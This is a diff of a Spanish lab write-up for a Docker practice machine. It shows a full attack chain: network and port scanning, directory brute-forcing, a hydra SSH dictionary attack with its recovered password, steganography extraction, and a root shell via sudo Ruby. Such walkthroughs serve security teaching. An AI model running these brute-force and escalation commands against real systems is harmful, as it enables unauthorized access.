@@ -25,13 +25,6 @@
 | **Comando usado** | `sudo netdiscover -i docker0 -r 172.17.0.0/24` |
 | **Propósito** | Descubre hosts activos mediante requests ARP en la red Docker |
 | **Salida esperada** | 2 hosts encontrados:<br>• 172.17.0.1<br>• 172.17.0.2 |
-| Currently scanning: Finished!   |   Screen View: Unique Hosts |
-| 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180 |
-_____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
------------------------------------------------------------------------------
-172.17.0.1     02:42:ac:11:00:01      1      60  Unknown vendor
-172.17.0.2     02:42:ac:11:00:02      2     120  Unknown vendor
 
 | **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
 |---------------------|-------------------|--------------------|
@@ -48,7 +41,7 @@ _____________________________________________________________________________
 |-------------|-------------|
 | **Comando usado** | `sudo nmap --min-rate 5,000 -p- -sS -sV 172.17.0.2` |
 | **Propósito** | Escaneo SYN stealth de todos los puertos TCP con detección de versiones |
-| **Salida esperada** | `````` |
+| **Salida esperada** | Puertos abiertos: 22/tcp (SSH) y 80/tcp (HTTP) |
 
 | **Alternativas avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
 |---------------------------|-------------------|--------------------|
@@ -56,6 +49,7 @@ _____________________________________________________________________________
 | `nmap -sU --top-ports 1,000 172.17.0.2` | Escaneo UDP de puertos más comunes | `161/udp open snmp` |
 | `nmap --script vuln 172.17.0.2` | Detección de vulnerabilidades con NSE | `CVE-2014-6271 (Shellshock) detected` |
 
+## **Casos de uso reales:**
 ---
 
 ## c) gobuster – Enumeración de Directorios Web
@@ -64,7 +58,7 @@ _____________________________________________________________________________
 |-------------|-------------|
 | **Comando usado** | `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
 | **Propósito** | Fuerza bruta de directorios ocultos usando wordlist de 220,560 entradas |
-| **Salida esperada** | `````` |
+| **Salida esperada** | Directorios: /images 301, /css 301, /js 301 |
 
 | **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
 |---------------------|-------------------|--------------------|
@@ -72,6 +66,7 @@ _____________________________________________________________________________
 | `-t 50 -q` | 50 hilos en modo silencioso | Mayor velocidad sin output verbose |
 | `-r -k` | Seguir redirects, ignorar SSL | `/secure/ -> /login.php` |
 
+## **Casos de uso reales:**
 ---
 
 ## d) hydra – Ataque de Fuerza Bruta SSH
@@ -80,7 +75,7 @@ _____________________________________________________________________________
 |-------------|-------------|
 | **Comando usado** | `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10` |
 | **Propósito** | Ataque de diccionario contra SSH |
-| **Salida esperada** | `````` |
+| **Salida esperada** | Credencial válida: carlota / babygirl |
 
 | **Variantes avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
 |------------------------|-------------------|--------------------|
@@ -88,6 +83,7 @@ _____________________________________________________________________________
 | `-s 2222` | Puerto SSH personalizado | `[2222][ssh] host: 172.17.0.2 login: admin password: 123456` |
 | `-C combo.txt -o results.txt` | Formato combinado usuario:password | Salida guardada en `results.txt` |
 
+## **Casos de uso reales:**
 ---
 
 ## e) scp – Transferencia Segura de Archivos
@@ -96,7 +92,7 @@ _____________________________________________________________________________
 |-------------|-------------|
 | **Comando usado** | `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor` |
 | **Propósito** | Descarga cifrada de archivo remoto |
-| **Salida esperada** | `````` |
+| **Salida esperada** | Transferencia 100% completada |
 
 | **Opciones avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
 |-----------------------|-------------------|--------------------|
@@ -104,6 +100,7 @@ _____________________________________________________________________________
 | `-P 2222 -i ~/.ssh/key.pem` | Puerto y clave específica | Transferencia a puerto 2222 |
 | `-v` | Modo verbose para debugging | `debug1: Authentication succeeded` |
 
+## **Casos de uso reales:**
 ---
 
 ## f) steghide – Análisis de Esteganografía
@@ -112,7 +109,7 @@ _____________________________________________________________________________
 |-------------|-------------|
 | **Comando usado** | `steghide --extract -sf imagen.jpg` |
 | **Propósito** | Extrae datos ocultos en JPEG |
-| **Salida esperada** | `````` |
+| **Salida esperada** | Archivo “secret.txt” extraído |
 
 | **Comandos relacionados** | **Funcionalidad** | **Ejemplo de uso** |
 |--------------------------|-------------------|--------------------|
@@ -120,6 +117,7 @@ _____________________________________________________________________________
 | `--embed -ef datos.txt -cf imagen.jpg -p clave` | Oculta datos con contraseña | Esteganografía ofensiva |
 | `--extract -sf imagen.jpg -xf output.txt` | Extrae a archivo específico | Output en `output.txt` |
 
+## **Casos de uso reales:**
 ---
 
 ## g) Escalada de Privilegios (su / sudo)
@@ -130,6 +128,8 @@ _____________________________________________________________________________
 | `su oscar` | Cambio a usuario `oscar` | `oscar@amor:~$` |
 | `sudo -l` | Lista permisos sudo | `NOPASSWD: /usr/bin/ruby` |
 | `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` | Shell root vía Ruby | `root@amor:~#` |
+
+## **Casos de uso reales:**
 
 # :three: Realice un diagrama de flujo de todo el procedimiento realizado.
 
